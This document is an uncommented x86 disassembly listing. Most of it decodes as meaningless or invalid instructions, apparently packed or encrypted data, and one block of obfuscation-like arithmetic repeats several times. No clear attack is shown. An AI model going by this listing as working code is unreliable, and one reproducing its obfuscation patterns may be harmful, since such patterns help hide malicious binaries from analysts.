  416b0f:	cmp    BYTE PTR [edi],ch
  416b11:	sub    ch,BYTE PTR [eax]
  416b13:	retf   
  416b14:	add    DWORD PTR [esi],ebx
  416b16:	(bad)  
  416b17:	popa   
  416b18:	(bad)  [edi-0x16c740b5]
  416b1e:	jle    0x416b30
  416b20:	xchg   edi,eax
  416b21:	shr    DWORD PTR [edx],cl
  416b23:	adc    al,0x87
  416b25:	enter  0xdd59,0xce
  416b29:	cwde   
  416b2a:	xchg   esp,eax
  416b2b:	dec    eax
  416b2c:	mov    esi,0x544e83d3
  416b31:	aam    0x1
  416b33:	call   0x99ef:0x732d1727
  416b3a:	test   dl,0x92
  416b3d:	stos   BYTE PTR es:[edi],al
  416b3e:	repnz stc 
  416b40:	test   al,0x2d
  416b42:	in     al,dx
  416b43:	pop    DWORD PTR [edi]
  416b45:	inc    ecx
  416b46:	pop    ebp
  416b47:	add    DWORD PTR [eax+0x4f1a27c2],0x6e
  416b4e:	bound  ebx,QWORD PTR ss:[edx-0x40ecab9f]
  416b55:	daa    
  416b56:	out    dx,al
  416b57:	bound  edx,QWORD PTR [esi+0x42]
  416b5a:	push   cs
  416b5b:	loopne 0x416ae2
  416b5d:	pop    ebx
  416b5e:	iret   
  416b5f:	xchg   ebx,eax
  416b60:	adc    al,0x4f
  416b62:	shl    al,1
  416b64:	mov    dl,0x66
  416b66:	add    BYTE PTR [ebx-0x722ee1b5],al
  416b6c:	pop    edi
  416b6d:	push   ss
  416b6e:	cmp    bh,BYTE PTR [esi-0x6306fd1b]
  416b74:	dec    edx
  416b75:	adc    al,0xf
  416b77:	in     eax,0x18
  416b79:	jb     0x416b74
  416b7b:	xor    edx,DWORD PTR [ecx]
  416b7d:	cmp    ecx,esp
  416b7f:	ss pop ebx
  416b81:	cwde   
  416b82:	dec    ebp
  416b83:	test   al,0xea
  416b85:	cmp    bh,ah
  416b87:	inc    ecx
  416b88:	mov    ebp,0x62e45d6f
  416b8d:	inc    esi
  416b8e:	stc    
  416b8f:	xor    edi,DWORD PTR ds:[ecx+edi*8]
  416b93:	cs mov ch,0x2f
  416b96:	fwait
  416b97:	out    dx,eax
  416b98:	in     eax,0xb4
  416b9a:	jg     0x416b4f
  416b9c:	add    eax,0x9531cc1b
  416ba1:	cmc    
  416ba2:	std    
  416ba3:	ds mov bh,0xbb
  416ba6:	sbb    al,0xd0
  416ba8:	mov    edx,0x1070b877
  416bad:	mov    dl,0x3b
  416baf:	imul   ecx,DWORD PTR [edx+0x5],0xda1a7d42
  416bb6:	(bad)  
  416bb7:	fisttp DWORD PTR ds:0x7701c75e
  416bbd:	sub    al,0x51
  416bbf:	out    0xa0,eax
  416bc1:	xor    cl,BYTE PTR [eax+0x11]
  416bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bc5:	mov    eax,ds:0xdba7e06a
  416bca:	push   cs
  416bcb:	jg     0x416bdb
  416bcd:	hlt    
  416bce:	aas    
  416bcf:	sbb    ah,BYTE PTR [esi+0x47]
  416bd2:	fcomp  st(4)
  416bd4:	ss jnp 0x416c3a
  416bd7:	pushf  
  416bd8:	push   edi
  416bd9:	shl    DWORD PTR [ebp+0x3d2dff83],1
  416bdf:	adc    al,0x89
  416be1:	push   edx
  416be2:	scas   eax,DWORD PTR es:[edi]
  416be3:	pop    ss
  416be4:	in     al,dx
  416be5:	mov    edi,0x9f41b7c9
  416bea:	test   eax,0x523771eb
  416bef:	out    dx,al
  416bf0:	jge    0x416c4d
  416bf2:	or     BYTE PTR [edi+ecx*2],dh
  416bf5:	jo     0x416c19
  416bf7:	mov    ch,0x1d
  416bf9:	aad    0xb2
  416bfb:	pop    DWORD PTR [edi+0x3f]
  416bfe:	add    ebx,DWORD PTR ss:0x72896d90
  416c05:	scas   eax,DWORD PTR es:[edi]
  416c06:	out    0x5f,eax
  416c08:	enter  0xebee,0x5f
  416c0c:	xlat   BYTE PTR ds:[ebx]
  416c0d:	leave  
  416c0e:	test   eax,0xde55d2eb
  416c13:	pop    eax
  416c14:	sbb    ah,BYTE PTR [ebx+ebp*4+0x28d8ed27]
  416c1b:	call   0x1b041b4f
  416c20:	and    esi,esi
  416c22:	repz sbb esi,DWORD PTR [eax+edi*2-0x53129f87]
  416c2a:	mov    dl,0xed
  416c2c:	popa   
  416c2d:	lds    ebx,FWORD PTR [ebx-0x6abd7c7f]
  416c33:	repnz sbb al,0xd7
  416c36:	or     al,0xf0
  416c38:	lock adc dl,dl
  416c3b:	shl    BYTE PTR [ebx-0x28f3afe6],1
  416c41:	or     DWORD PTR [bx+si+0x68],ebp
  416c45:	sbb    BYTE PTR [ebx+0x101e6098],bh
  416c4b:	push   ebx
  416c4c:	jl     0x416bf2
  416c4e:	adc    DWORD PTR ds:[esi-0x48],edx
  416c52:	adc    ebx,DWORD PTR [ebp-0x5e69b0ed]
  416c58:	mov    ds:0x9334d8da,al
  416c5d:	and    BYTE PTR [edi-0xe],al
  416c60:	jb     0x416c4c
  416c62:	sub    edi,DWORD PTR [edx-0x7db500bf]
  416c68:	jno    0x416c84
  416c6a:	cmp    DWORD PTR [ecx-0xc2445cc],0x52
  416c71:	push   ebx
  416c72:	xlat   BYTE PTR ds:[ebx]
  416c73:	push   0xffffff94
  416c75:	mov    ebx,0xa086db75
  416c7a:	push   esi
  416c7b:	fs je  0x416ca6
  416c7e:	call   0x817b04d0
  416c83:	(bad)  [esi+0x5084d805]
  416c89:	dec    esp
  416c8a:	daa    
  416c8b:	out    dx,al
  416c8c:	and    al,0x93
  416c8e:	fs ins DWORD PTR es:[edi],dx
  416c90:	mov    ebx,DWORD PTR [ebp-0x8]
  416c93:	xor    edx,eax
  416c95:	xor    ebx,eax
  416c97:	sub    edx,ebx
  416c99:	sub    edx,esi
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    cl,ah
  416df4:	dec    ebp
  416df5:	ficom  WORD PTR [edi-0x7c7fba8c]
  416dfb:	ds pop esi
  416dfd:	add    DWORD PTR [ebx-0xca58089],0xffffffba
  416e04:	and    ch,al
  416e06:	mov    eax,0x9ecd6d35
  416e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0c:	into   
  416e0d:	dec    ebp
  416e0e:	nop
  416e0f:	mov    edi,0x9c32ce9a
  416e14:	jecxz  0x416e88
  416e16:	xor    DWORD PTR [ebp+eax*4-0x34b26044],0x67ffafce
  416e21:	test   BYTE PTR [ebx+esi*2+0x60108816],ah
  416e28:	in     eax,dx
  416e29:	inc    esp
  416e2a:	and    edi,ecx
  416e2c:	or     eax,0x902f5b76
  416e31:	inc    edx
  416e32:	(bad)  
  416e33:	lahf   
  416e34:	adc    DWORD PTR [edx],0xffffff8d
  416e37:	leave  
  416e38:	mov    ecx,ecx
  416e3a:	or     eax,DWORD PTR [edi-0x6e]
  416e3d:	mov    eax,ds:0x29fb9d9a
  416e42:	ja     0x416e45
  416e44:	sub    BYTE PTR [esi-0x6d100e8e],ch
  416e4a:	(bad)  
  416e4c:	(bad)  
  416e4d:	xchg   ebp,eax
  416e4e:	mov    bh,0x42
  416e50:	pop    ds
  416e51:	aas    
  416e52:	xchg   ebp,eax
  416e53:	dec    esi
  416e54:	jo     0x416e3d
  416e56:	xor    bl,dl
  416e58:	and    al,0x3
  416e5a:	mov    al,BYTE PTR [esi+0xe]
  416e5d:	pop    ecx
  416e5e:	mov    ebp,0x56667913
  416e63:	add    eax,0x98cd46c0
  416e68:	and    DWORD PTR [eax+eax*1-0x1f657b9],0x32
  416e70:	lods   eax,DWORD PTR ds:[esi]
  416e71:	fsub   QWORD PTR [edi-0x48cd62b8]
  416e77:	mov    ax,0x50f3
  416e7b:	lock lods eax,DWORD PTR ds:[esi]
  416e7d:	push   edx
  416e7e:	retf   0xf5fb
  416e81:	lock mov ah,0xa6
  416e84:	(bad)  
  416e85:	int3   
  416e86:	xor    DWORD PTR [esi+0x5d],ecx
  416e89:	test   eax,0xfb97cf84
  416e8e:	mov    edx,0x5226991e
  416e93:	push   ebp
  416e94:	stos   WORD PTR es:[edi],ax
  416e96:	push   ecx
  416e97:	dec    ebx
  416e98:	push   esp
  416e99:	push   esp
  416e9a:	jns    0x416f03
  416e9c:	and    ch,BYTE PTR [edi-0x4e]
  416e9f:	cmp    BYTE PTR [edi],0x28
  416ea2:	mov    BYTE PTR [ecx],ch
  416ea4:	retf   
  416ea5:	enter  0xf0c1,0x61
  416ea9:	mov    bh,0x9b
  416eab:	dec    edi
  416eac:	js     0x416edc
  416eae:	add    ch,BYTE PTR [esi]
  416eb0:	fld1   
  416eb2:	bound  ebx,QWORD PTR [edi-0x25]
  416eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb6:	dec    ecx
  416eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb8:	and    ch,0xf3
  416ebb:	xchg   esi,eax
  416ebc:	test   eax,0x155beee1
  416ec1:	mov    bl,0xde
  416ec3:	push   ds
  416ec4:	jmp    0xec83fe12
  416ec9:	or     al,dh
  416ecb:	xor    eax,ecx
  416ecd:	fmulp  st(4),st
  416ecf:	cmp    edi,edi
  416ed1:	adc    al,BYTE PTR [bp+si-0x2277]
  416ed6:	pop    es
  416ed7:	mov    al,0x6b
  416ed9:	aas    
  416eda:	lds    edx,FWORD PTR [ecx-0x6596e012]
  416ee0:	lahf   
  416ee1:	test   eax,0x72b7a714
  416ee6:	push   0x48
  416ee8:	push   ebp
  416ee9:	jmp    0x96ea:0xe5074537
  416ef0:	inc    edi
  416ef1:	mov    esp,0x9f18c39a
  416ef6:	jne    0x416ed7
  416ef8:	aam    0x84
  416efa:	ins    BYTE PTR es:[edi],dx
  416efb:	jge    0x416eb1
  416efd:	test   al,0x80
  416eff:	(bad)  
  416f00:	cmp    BYTE PTR [ecx],ah
  416f02:	sub    DWORD PTR [eax-0x4e6836de],ecx
  416f08:	cmp    eax,0x5346364b
  416f0d:	mov    esi,0xaffa811a
  416f12:	pop    ds
  416f13:	ins    DWORD PTR es:[edi],dx
  416f14:	rcl    dh,cl
  416f16:	shl    BYTE PTR [eax+0x68],1
  416f19:	pop    ecx
  416f1a:	jae    0x416eeb
  416f1c:	aad    0xd9
  416f1e:	js     0x416ef3
  416f20:	pop    edi
  416f21:	in     al,dx
  416f22:	push   ds
  416f23:	adc    eax,0x41115050
  416f28:	pop    edi
  416f29:	sub    dh,bh
  416f2b:	cmc    
  416f2c:	adc    ebx,edx
  416f2e:	cwde   
  416f2f:	mov    ebx,ecx
  416f31:	adc    DWORD PTR ds:0x2ec9b76d,esp
  416f37:	push   edi
  416f38:	adc    ch,BYTE PTR [ebx+0x42406d35]
  416f3e:	pop    ebx
  416f3f:	jp     0x416f78
  416f41:	cli    
  416f42:	sub    eax,0x59502f02
  416f47:	ja     0x416ede
  416f49:	in     eax,dx
  416f4a:	fnstenv [ecx+0x11]
  416f4d:	in     eax,dx
  416f4e:	cmc    
  416f4f:	test   al,0x29
  416f51:	mov    esp,0x8aa58df6
  416f56:	lods   eax,DWORD PTR ds:[esi]
  416f57:	dec    ecx
  416f58:	ret    
  416f59:	jae    0x416f96
  416f5b:	mov    ds:0x64224000,eax
  416f60:	stc    
  416f61:	lods   eax,DWORD PTR ds:[esi]
  416f63:	push   ds
  416f64:	or     esp,DWORD PTR [edi-0x29f191e7]
  416f6a:	pop    eax
  416f6b:	sbb    bl,BYTE PTR [esi]
  416f6d:	adc    al,0xab
  416f6f:	push   esp
  416f70:	(bad)  [edx+0x3e86416a]
  416f76:	js     0x416fef
  416f78:	arpl   WORD PTR [edx+0x2b],bx
  416f7b:	xchg   esp,eax
  416f7c:	ins    DWORD PTR es:[edi],dx
  416f7d:	arpl   WORD PTR [esp+edx*2+0x2cf17b09],bx
  416f84:	out    dx,al
  416f85:	fcmovnb st,st(6)
  416f87:	shl    BYTE PTR [ebp+0x1565e7c7],0x8c
  416f8e:	mov    al,ds:0xea6d8553
  416f93:	cmp    BYTE PTR [ecx],bh
  416f95:	(bad)  
  416f96:	je     0x416fcd
  416f98:	add    eax,0x90f866a5
  416f9d:	adc    BYTE PTR [ecx+eiz*8],ah
  416fa0:	in     al,dx
  416fa1:	mov    DWORD PTR [ebx+eiz*4-0xd9bbeba],esi
  416fa8:	add    al,0x2a
  416faa:	mov    ebx,0x32f26fea
  416faf:	sub    eax,0x2c37aefb
  416fb4:	(bad)  
  416fb5:	int    0xc9
  416fb7:	adc    edi,esp
  416fb9:	aaa    
  416fba:	dec    eax
  416fbb:	cli    
  416fbc:	jg     0x416ff5
  416fbe:	ret    0xd2cb
  416fc1:	mov    ds:0xca742a50,eax
  416fc6:	js     0x417017
  416fc8:	js     0x416fa1
  416fca:	jo     0x416fae
  416fcc:	pushf  
  416fcd:	iret   
  416fce:	dec    ebx
  416fcf:	push   esi
  416fd0:	inc    edi
  416fd1:	mov    bh,0xcc
  416fd3:	scas   al,BYTE PTR es:[edi]
  416fd4:	int    0x43
  416fd6:	loope  0x416fe5
  416fd8:	adc    DWORD PTR [eax],ebp
  416fda:	adc    al,dl
  416fdc:	cmp    bl,BYTE PTR [ebp+0x2b797525]
  416fe2:	pop    eax
  416fe3:	push   edi
  416fe4:	pop    eax
  416fe5:	mov    ebx,esi
  416fe7:	es push ebp
  416fe9:	and    BYTE PTR [ebp-0x43eb6240],0x7f
  416ff0:	wbinvd 
  416ff2:	scas   al,BYTE PTR es:[edi]
  416ff3:	or     al,0xe2
  416ff5:	test   eax,0xe17dca19
  416ffa:	push   eax
  416ffb:	jbe    0x417026
  416ffd:	(bad)  
  416ffe:	retf   
  416fff:	inc    ecx
  417000:	in     al,0xea
  417002:	xor    BYTE PTR ds:0x62f2c85f,bh
  417008:	mov    ?,WORD PTR [edi]
  41700a:	test   BYTE PTR [edx-0x7db7202e],ah
  417010:	popf   
  417011:	cwde   
  417012:	dec    edi
  417013:	mov    eax,0x22fc81d0
  417018:	repz sub al,0x8e
  41701b:	jb     0x417062
  41701d:	inc    eax
  41701e:	inc    ecx
  41701f:	ins    DWORD PTR es:[edi],dx
  417020:	jb     0x416fa8
  417022:	pop    ebp
  417023:	je     0x4170a1
  417025:	retf   
  417026:	test   al,0xee
  417028:	popa   
  417029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702a:	lahf   
  41702b:	(bad)  
  41702c:	(bad)  
  41702d:	jb     0x41708e
  41702f:	loope  0x417081
  417031:	sub    ah,BYTE PTR [ecx+0x56081d0f]
  417037:	jb     0x41704c
  417039:	rol    BYTE PTR [esi+0x15e17649],cl
  41703f:	mov    al,0x5f
  417041:	std    
  417042:	imul   eax,eax,0x35
  417045:	jbe    0x417031
  417047:	imul   esp,DWORD PTR ds:0xe9cff6f1,0xffffff84
  41704e:	loopne 0x417086
  417050:	fsubr  DWORD PTR [eax+0x64]
  417053:	dec    ebx
  417054:	dec    ebp
  417055:	scas   eax,DWORD PTR es:[edi]
  417056:	fidivr DWORD PTR [edx-0x45]
  417059:	call   0x69ef2d5b
  41705e:	jecxz  0x4170b2
  417060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417061:	add    DWORD PTR [esi],ecx
  417063:	or     DWORD PTR [edi+0x45e2a9f5],edi
  417069:	test   DWORD PTR [esi+edi*2-0x7c],eax
  41706d:	ins    BYTE PTR es:[edi],dx
  41706e:	out    dx,eax
  41706f:	in     eax,dx
  417070:	loop   0x4170a4
  417072:	and    dh,BYTE PTR [esi-0x35]
  417075:	test   DWORD PTR [ebx-0x2cdb26f8],ebx
  41707b:	lods   eax,DWORD PTR ds:[esi]
  41707c:	mov    cl,0x32
  41707e:	pop    eax
  41707f:	pop    ds
  417080:	dec    esi
  417081:	mov    bl,0x90
  417083:	mov    esi,ecx
  417085:	out    0xa7,al
  417087:	push   esp
  417088:	in     al,0x1c
  41708a:	inc    ebp
  41708b:	push   esp
  41708c:	xchg   esi,eax
  41708d:	sbb    ecx,DWORD PTR [ebx+0x78]
  417090:	jae    0x417035
  417092:	adc    edx,edx
  417094:	mov    bl,0x30
  417096:	icebp  
  417097:	ins    DWORD PTR es:[edi],dx
  417098:	int    0x9a
  41709a:	lahf   
  41709b:	adc    dl,dh
  41709d:	mov    ds:0xca6ed7ca,eax
  4170a2:	aas    
  4170a3:	push   0xea63e3f9
  4170a8:	and    cl,BYTE PTR [edx+0x6f232b77]
  4170ae:	mov    bh,0xfe
  4170b0:	in     eax,0x3
  4170b2:	xchg   edx,eax
  4170b3:	and    eax,0xde04d0f6
  4170b8:	mov    al,bh
  4170ba:	adc    DWORD PTR [ecx-0x36],ebp
  4170bd:	daa    
  4170be:	mov    dl,0xe7
  4170c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170c1:	mov    ah,0x88
  4170c3:	test   al,0xc6
  4170c5:	push   ebp
  4170c7:	adc    BYTE PTR [ecx-0x6d],cl
  4170ca:	or     BYTE PTR [edx+0x5c2ef83e],ah
  4170d0:	dec    ebp
  4170d1:	in     eax,0xdb
  4170d3:	push   esp
  4170d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d5:	fmul   st(1),st
  4170d7:	fist   WORD PTR [edi-0x28]
  4170da:	push   ss
  4170db:	pop    eax
  4170dc:	sub    eax,ecx
  4170de:	sbb    eax,0x19cbd021
  4170e3:	call   DWORD PTR [ecx+0x6a894b1c]
  4170e9:	push   edx
  4170ea:	mov    edi,0x763afcce
  4170ef:	mov    ah,0x18
  4170f1:	push   ds
  4170f2:	enter  0xe322,0x68
  4170f6:	aaa    
  4170f7:	or     esi,edx
  4170f9:	mov    BYTE PTR ds:0x6ca0cc6d,bl
  4170ff:	stos   BYTE PTR es:[edi],al
  417100:	loop   0x4170dc
  417102:	cli    
  417103:	shr    DWORD PTR [eax-0x24],cl
  417106:	and    al,ch
  417108:	mov    bh,0x6f
  41710a:	mov    al,0x6d
  41710c:	daa    
  41710d:	stos   DWORD PTR es:[edi],eax
  41710e:	jb     0x417138
  417110:	jle    0x41710e
  417112:	inc    edi
  417113:	in     al,dx
  417114:	xor    bl,BYTE PTR [edi-0x60968fbd]
  41711a:	add    BYTE PTR [edi-0xbd9c83b],ah
  417120:	loop   0x4170f8
  417122:	in     eax,dx
  417123:	cmp    BYTE PTR [ecx],ah
  417125:	les    esp,FWORD PTR [eax+0x36579512]
  41712b:	pop    ss
  41712c:	mov    cl,cl
  41712e:	cmp    bh,cl
  417130:	js     0x417172
  417132:	adc    DWORD PTR [esi-0x566f09a5],edi
  417138:	pop    ecx
  417139:	nop
  41713a:	push   cs
  41713b:	mov    dh,0x5e
  41713d:	bound  esi,QWORD PTR [ebx+0x7e]
  417140:	mov    cl,0x8e
  417142:	in     eax,0x43
  417144:	cld    
  417145:	inc    edx
  417146:	jl     0x417165
  417148:	iret   
  417149:	and    BYTE PTR [ecx-0x5cf46446],0xcf
  417150:	loope  0x4171a6
  417152:	repz popf 
  417154:	out    0xe4,eax
  417156:	mov    edi,0xb2bb47f6
  41715b:	or     BYTE PTR [ebp-0x7d],bl
  41715e:	adc    DWORD PTR [edi-0x29],ecx
  417161:	inc    ecx
  417162:	mov    dl,0x83
  417164:	xchg   ecx,eax
  417165:	mov    al,ds:0x43d3642f
  41716a:	xchg   esp,eax
  41716b:	daa    
  41716c:	pop    es
  41716d:	nop
  41716e:	jb     0x41715c
  417170:	jae    0x4171ad
  417172:	out    0x30,eax
  417174:	xor    BYTE PTR [edi+edx*4+0x65],dl
  417178:	push   cs
  417179:	ffreep st(1)
  41717b:	cwde   
  41717c:	rol    BYTE PTR [edx+esi*4],0xb8
  417180:	add    al,0x1f
  417182:	xor    edi,0xffffffed
  417185:	(bad)  
  417186:	or     BYTE PTR [ebx-0x2b],bh
  417189:	icebp  
  41718a:	ja     0x417168
  41718c:	cmp    DWORD PTR [ebp+0x21],ebx
  41718f:	and    cl,bl
  417191:	jl     0x41718b
  417193:	mov    ss,WORD PTR [ecx+eax*4-0x71685a7e]
  41719a:	xchg   esi,eax
  41719b:	mov    edx,0xa5ac2e8c
  4171a0:	and    al,0x33
  4171a2:	scas   al,BYTE PTR es:[edi]
  4171a3:	fcomp  QWORD PTR [ebx+ebx*2-0xb]
  4171a7:	inc    esp
  4171a8:	jecxz  0x41719a
  4171aa:	scas   al,BYTE PTR es:[edi]
  4171ab:	sbb    al,BYTE PTR [ebx]
  4171ad:	out    0x21,al
  4171af:	xor    al,0x60
  4171b1:	sub    eax,0xf31baa4
  4171b6:	push   esp
  4171b7:	inc    ebp
  4171b8:	retf   
  4171b9:	mov    dl,0x31
  4171bb:	mov    dh,0x24
  4171bd:	push   edx
  4171be:	pop    es
  4171bf:	mov    BYTE PTR fs:[ebx+0x57],ch
  4171c3:	fwait
  4171c4:	mov    DWORD PTR [eax+eiz*1],ebx
  4171c7:	push   0xffffff8f
  4171c9:	cmp    dh,dh
  4171cb:	retf   
  4171cc:	cdq    
  4171cd:	mul    DWORD PTR [ebp+0x5d]
  4171d0:	in     al,0x28
  4171d2:	ret    0xd6cc
  4171d5:	dec    ebx
  4171d6:	aam    0xfc
  4171d8:	mov    DWORD PTR [ebp+ebx*1-0x3503eaab],edx
  4171df:	mov    bh,0x9
  4171e1:	push   edi
  4171e2:	pop    es
  4171e3:	pop    esp
  4171e4:	xchg   BYTE PTR [esi],dh
  4171e6:	jno    0x4171dd
  4171e8:	imul   ebp,DWORD PTR [ebp-0x5f3ace47],0x53
  4171ef:	jnp    0x417183
  4171f1:	retf   0x521d
  4171f4:	push   ebp
  4171f5:	addr16 out dx,al
  4171f7:	xor    DWORD PTR [edx],eax
  4171f9:	(bad)  
  4171fa:	pop    ss
  4171fb:	jmp    FWORD PTR [edi+0x1b02c78d]
  417201:	cdq    
  417202:	or     eax,0x20379548
  417207:	push   ebp
  417208:	sbb    BYTE PTR [ecx-0x6c395fbb],ch
  41720e:	mov    DWORD PTR [esi+eax*8],ebx
  417211:	pop    ds
  417212:	mov    edx,0xf2162b1e
  417217:	clc    
  417218:	getsec 
  41721a:	mov    bh,0x94
  41721c:	jl     0x4171cb
  41721e:	mov    edx,0xa14523b9
  417223:	inc    ebx
  417224:	ins    DWORD PTR es:[edi],dx
  417225:	fnstenv [edx]
  417227:	icebp  
  417228:	mov    edx,0x86425428
  41722d:	(bad)
  417232:	scas   eax,DWORD PTR es:[edi]
  417233:	ret    
  417234:	push   esi
  417235:	popf   
  417236:	test   eax,0x47c454ed
  41723b:	mov    esp,0x84b39c82
  417240:	lods   eax,DWORD PTR ds:[esi]
  417241:	or     eax,0x3cd1182d
  417246:	sbb    BYTE PTR [eax+0xaca7747],al
  41724c:	pop    ebx
  41724d:	imul   esi,esp,0x2d
  417250:	sub    edx,DWORD PTR ds:0xde8e0664
  417256:	stc    
  417257:	clc    
  417258:	xchg   DWORD PTR ds:0x900002b,edx
  41725e:	or     BYTE PTR [edx],bh
  417260:	mov    bl,0x53
  417262:	push   ebp
  417263:	mov    eax,DWORD PTR [edx+0x51]
  417266:	xchg   esp,eax
  417267:	mov    BYTE PTR [ecx+0x69],dl
  41726a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41726b:	mov    WORD PTR ds:0xac60c542,?
  417271:	jg     0x4171fd
  417273:	sub    eax,ebx
  417275:	add    ebp,edi
  417277:	data16 stc 
  417279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727a:	cmp    DWORD PTR ds:0x133c2caf,ecx
  417280:	repnz (bad) 
  417282:	adc    eax,0x9c8d7e31
  417287:	(bad)  
  417288:	mov    eax,ds:0xe8352f4f
  41728d:	aad    0x73
  41728f:	and    eax,DWORD PTR [edi-0x12]
  417292:	sub    BYTE PTR [ebp+0x64c973a6],cl
  417298:	xor    DWORD PTR [edx+0x26],0xa
  41729c:	pop    es
  41729d:	jno    0x4172bf
  41729f:	sar    BYTE PTR [edi+0x651e43b4],0xe4
  4172a6:	jg     0x417294
  4172a8:	leave  
  4172a9:	dec    eax
  4172aa:	mov    eax,ds:0xfc77f906
  4172af:	idiv   BYTE PTR gs:[edi-0x33538822]
  4172b6:	and    ecx,DWORD PTR [eax-0x1a2ce304]
  4172bc:	dec    esp
  4172bd:	retf   
  4172be:	jmp    0xb46e3697
  4172c3:	lahf   
  4172c4:	scas   al,BYTE PTR es:[edi]
  4172c5:	jle    0x4172f4
  4172c7:	lods   eax,DWORD PTR ds:[esi]
  4172c8:	or     bl,bh
  4172ca:	loopne 0x417301
  4172cc:	or     DWORD PTR ds:0x82a64068,0x50d836cd
  4172d6:	(bad)  
  4172d7:	push   0x529a8eff
  4172dc:	xchg   edi,eax
  4172dd:	push   cs
  4172de:	mov    cl,0x7
  4172e0:	xchg   edi,eax
